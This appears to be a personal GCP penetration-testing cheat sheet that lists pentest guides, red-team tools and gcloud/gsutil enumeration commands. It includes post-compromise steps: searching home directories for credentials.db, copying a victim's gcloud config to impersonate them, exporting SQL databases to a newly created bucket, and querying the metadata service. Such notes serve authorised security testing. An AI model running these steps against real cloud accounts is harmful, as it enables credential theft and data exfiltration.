## Docu
https://six2dez.gitbook.io/pentest-book/enumeration/cloud/gcp
### Pentesting Tactics
https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
### IAM and Rolse References
https://cloud.google.com/iam/docs/permissions-reference
https://cloud.google.com/iam/docs/understanding-roles
### Persistence with SSH keys
https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#gcloud-or-api

## Tools
### Firewall enum
https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_firewall_enum
### Enumerate GCP
https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_enum
### Vulneravility scaner
https://github.com/aquasecurity/cloudsploit/blob/master/docs/gcp.md#cloud-provider-configuration
### Hardening review
https://github.com/DenizParlak/hayat
### Bruteforce Buckets
https://github.com/RhinoSecurityLabs/GCPBucketBrute
### IAM vsualization
https://github.com/marcin-kolda/gcp-iam-collector
### Gather information
https://github.com/nccgroup/ScoutSuite
### Miscelania
https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_misc

## Usefull comands
### Authentication with gcloud and retrieve info
```
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth list
gcloud config list
gcloud organizations list
gcloud organizations get-iam-policy <org ID>
gcloud projects get-iam-policy <project ID>
gcloud projects list
gcloud config set project <project name>
gcloud services list
gcloud source repos list
gcloud source repos clone <repo_name>
```

### Virtual Machines
```
gcloud compute instances list
gcloud beta compute ssh --zone "<region>" "<instance name>" --project "<project name>"
```
### Puts public ssh key onto metadata service for project
```
gcloud compute ssh <local host>
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H &#39;Metadata-Flavor:Googleâ€™
```
### Use Google keyring to decrypt encrypted data
```
gcloud kms decrypt --ciphertext-file=encrypted-file.enc --plaintext-file=out.txt --key <crypto-key> --keyring <crypto-keyring> --location global
```

### Storage Buckets
#### List Google Storage buckets
```
gsutil ls
gsutil ls -r gs://<bucket name>
gsutil cp gs://bucketid/item ~/
```

### Webapps & SQL
```
gcloud app instances list
gcloud sql instances list
gcloud spanner instances list
gcloud bigtable instances list
gcloud sql databases list --instance <instance ID>
gcloud spanner databases list --instance <instance name>
```
### Export SQL databases and buckets
#### First copy buckets to local directory
```
gsutil cp gs://bucket-name/folder/ .
```
#### Create a new storage bucket, change perms, export SQL DB
```
gsutil mb gs://<googlestoragename>
gsutil acl ch -u <service account> gs://<googlestoragename>
gcloud sql export sql <sql instance name> gs://<googlestoragename>/sqldump.gz --database=<database name>
```
### Networking
```
gcloud compute networks list
gcloud compute networks subnets list
gcloud compute vpn-tunnels list
gcloud compute interconnects list
```

### Containers
```
gcloud container clusters list
```

### GCP Kubernetes config file
```
 ~/.kube/config #gets generated when you are authenticated with
gcloud container clusters get-credentials <cluster name> --region <region>
kubectl cluster-info
```

### Serverless
```
gcloud functions list
gcloud functions describe <function name>
gcloud functions logs read <function name> --limit <number of lines>
```

### Gcloud stores creds in
``` ~/.config/gcloud/credentials.db # Search home directories
sudo find /home -name "credentials.db
```

### Copy gcloud dir to your own home directory to auth as the compromised user
```
sudo cp -r /home/username/.config/gcloud ~/.config
sudo chown -R currentuser:currentuser ~/.config/gcloud
gcloud auth list
```

### Metadata Service URL
```
# metadata.google.internal = 169.254.169.254
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H
"Metadata-Flavor: Google"
```